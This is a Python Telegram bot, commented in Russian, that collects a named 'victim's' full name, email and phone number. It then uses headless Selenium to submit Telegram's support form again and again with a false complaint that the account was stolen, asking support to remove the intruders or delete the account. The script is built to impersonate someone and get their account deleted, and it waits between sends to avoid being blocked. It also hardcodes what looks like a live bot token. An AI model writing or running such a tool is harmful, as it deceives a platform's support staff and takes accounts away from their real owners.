from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

# Этапы диалога
FIO, EMAIL, PHONE, REPEAT = range(4)

# Текст жалобы (фиксированный)
COMPLAINT_TEXT = """
Здравствуйте, уважаемая поддержка Telegram. 
Сегодня у меня украли аккаунт, и я не могу сбросить пароль, потому что его отменяют. 
Уберите, пожалуйста, злоумышленников с моего аккаунта или удалите его.

Hello, dear Telegram support, 
my account was stolen today, and I can't reset the password because it's being revoked. 
Please remove the intruders from my account or delete it.
"""

def start(update: Update, context):
    update.message.reply_text("🔹 Введите ФИО жертвы:")
    return FIO

def get_fio(update: Update, context):
    context.user_data['fio'] = update.message.text
    update.message.reply_text("📧 Введите email:")
    return EMAIL

def get_email(update: Update, context):
    context.user_data['email'] = update.message.text
    update.message.reply_text("📞 Введите номер телефона:")
    return PHONE

def get_phone(update: Update, context):
    context.user_data['phone'] = update.message.text
    update.message.reply_text("🔄 Сколько раз отправить жалобу?")
    return REPEAT

def send_reports(update: Update, context):
    repeat = int(update.message.text)
    fio = context.user_data['fio']
    email = context.user_data['email']
    phone = context.user_data['phone']

    # Настройка Selenium (можно добавить прокси)
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')  # Режим без GUI
    driver = webdriver.Chrome(options=options)

    for _ in range(repeat):
        try:
            driver.get("https://telegram.org/support")
            time.sleep(2)
            
            # Заполнение формы
            driver.find_element(By.NAME, "email").send_keys(email)
            driver.find_element(By.NAME, "phone").send_keys(phone)
            driver.find_element(By.NAME, "name").send_keys(fio)
            driver.find_element(By.NAME, "subject").send_keys(COMPLAINT_TEXT)
            
            # Отправка
            driver.find_element(By.XPATH, "//button[@type='submit']").click()
            time.sleep(3)  # Задержка для избежания блокировки
            
        except Exception as e:
            print(f"Ошибка: {e}")
            continue

    driver.quit()
    update.message.reply_text(f"✅ Отправлено {repeat} жалоб!")
    return ConversationHandler.END

def main():
    bot = Bot(token="7662589195:AAFC7khTvopOHZIWUYKKHkF3O7DH6mEJKhY")
    updater = Updater(bot=bot, use_context=True)
    dp = updater.dispatcher

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            FIO: [MessageHandler(Filters.text, get_fio)],
            EMAIL: [MessageHandler(Filters.text, get_email)],
            PHONE: [MessageHandler(Filters.text, get_phone)],
            REPEAT: [MessageHandler(Filters.text, send_reports)],
        },
        fallbacks=[]
    )

    dp.add_handler(conv_handler)
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
